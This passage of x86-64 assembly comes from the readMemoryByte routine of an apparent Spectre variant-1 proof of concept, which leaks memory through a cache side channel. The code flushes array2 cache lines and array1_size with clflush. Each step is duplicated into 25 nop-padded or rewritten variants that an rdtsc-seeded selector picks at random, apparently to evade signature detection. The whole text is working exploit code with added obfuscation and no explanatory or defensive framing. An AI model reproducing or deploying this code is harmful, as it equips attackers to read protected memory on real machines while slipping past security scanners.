	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 1
.LreadMemoryByte_win8_var1:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 2
.LreadMemoryByte_win8_var2:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 3
.LreadMemoryByte_win8_var3:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 4
.LreadMemoryByte_win8_var4:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 5
.LreadMemoryByte_win8_var5:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 6
.LreadMemoryByte_win8_var6:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 7
.LreadMemoryByte_win8_var7:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 8
.LreadMemoryByte_win8_var8:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 9
.LreadMemoryByte_win8_var9:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 10
.LreadMemoryByte_win8_var10:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 11
.LreadMemoryByte_win8_var11:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 12
.LreadMemoryByte_win8_var12:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 13
.LreadMemoryByte_win8_var13:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 14
.LreadMemoryByte_win8_var14:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 15
.LreadMemoryByte_win8_var15:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 16
.LreadMemoryByte_win8_var16:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 17
.LreadMemoryByte_win8_var17:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 18
.LreadMemoryByte_win8_var18:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 19
.LreadMemoryByte_win8_var19:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 20
.LreadMemoryByte_win8_var20:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 21
.LreadMemoryByte_win8_var21:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 22
.LreadMemoryByte_win8_var22:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 23
.LreadMemoryByte_win8_var23:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 24
.LreadMemoryByte_win8_var24:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	nop
	nop
	jmp	.LreadMemoryByte_win8_continue
.LreadMemoryByte_win8_continue:
LBB1_7:                                 ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win7_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win7_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win7_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win7_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win7_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win7_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win7_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win7_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win7_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win7_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win7_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win7_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win7_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win7_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win7_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win7_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win7_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win7_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win7_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win7_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win7_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win7_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win7_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win7_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win7_var24
	jmp	.LreadMemoryByte_win7_var0
## Variant 0
.LreadMemoryByte_win7_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 1
.LreadMemoryByte_win7_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 2
.LreadMemoryByte_win7_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 3
.LreadMemoryByte_win7_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 4
.LreadMemoryByte_win7_var4:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 5
.LreadMemoryByte_win7_var5:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 6
.LreadMemoryByte_win7_var6:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 7
.LreadMemoryByte_win7_var7:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 8
.LreadMemoryByte_win7_var8:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 9
.LreadMemoryByte_win7_var9:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 10
.LreadMemoryByte_win7_var10:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 11
.LreadMemoryByte_win7_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	nop
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 12
.LreadMemoryByte_win7_var12:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 13
.LreadMemoryByte_win7_var13:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 14
.LreadMemoryByte_win7_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 15
.LreadMemoryByte_win7_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 16
.LreadMemoryByte_win7_var16:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 17
.LreadMemoryByte_win7_var17:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 18
.LreadMemoryByte_win7_var18:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 19
.LreadMemoryByte_win7_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 20
.LreadMemoryByte_win7_var20:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 21
.LreadMemoryByte_win7_var21:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 22
.LreadMemoryByte_win7_var22:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 23
.LreadMemoryByte_win7_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 24
.LreadMemoryByte_win7_var24:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	shll	$9, %eax
	nop
	nop
	movslq	%eax, %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	jmp	.LreadMemoryByte_win7_continue
.LreadMemoryByte_win7_continue:
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.9:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_7
LBB1_10:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	movl	%edx, %eax
                                        ## kill: def $rax killed $eax
	movq	%rax, -80(%rbp)
	movl	$59, -60(%rbp)
LBB1_11:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Loop Header: Depth=2
                                        ##       Child Loop BB1_13 Depth 3
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win6_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win6_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win6_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win6_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win6_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win6_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win6_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win6_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win6_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win6_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win6_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win6_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win6_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win6_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win6_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win6_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win6_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win6_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win6_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win6_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win6_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win6_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win6_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win6_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win6_var24
	jmp	.LreadMemoryByte_win6_var0
## Variant 0
.LreadMemoryByte_win6_var0:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 1
.LreadMemoryByte_win6_var1:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 2
.LreadMemoryByte_win6_var2:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 3
.LreadMemoryByte_win6_var3:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 4
.LreadMemoryByte_win6_var4:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 5
.LreadMemoryByte_win6_var5:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 6
.LreadMemoryByte_win6_var6:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 7
.LreadMemoryByte_win6_var7:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 8
.LreadMemoryByte_win6_var8:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 9
.LreadMemoryByte_win6_var9:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 10
.LreadMemoryByte_win6_var10:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 11
.LreadMemoryByte_win6_var11:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 12
.LreadMemoryByte_win6_var12:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 13
.LreadMemoryByte_win6_var13:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 14
.LreadMemoryByte_win6_var14:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 15
.LreadMemoryByte_win6_var15:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 16
.LreadMemoryByte_win6_var16:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 17
.LreadMemoryByte_win6_var17:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 18
.LreadMemoryByte_win6_var18:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 19
.LreadMemoryByte_win6_var19:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 20
.LreadMemoryByte_win6_var20:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 21
.LreadMemoryByte_win6_var21:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 22
.LreadMemoryByte_win6_var22:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 23
.LreadMemoryByte_win6_var23:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 24
.LreadMemoryByte_win6_var24:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
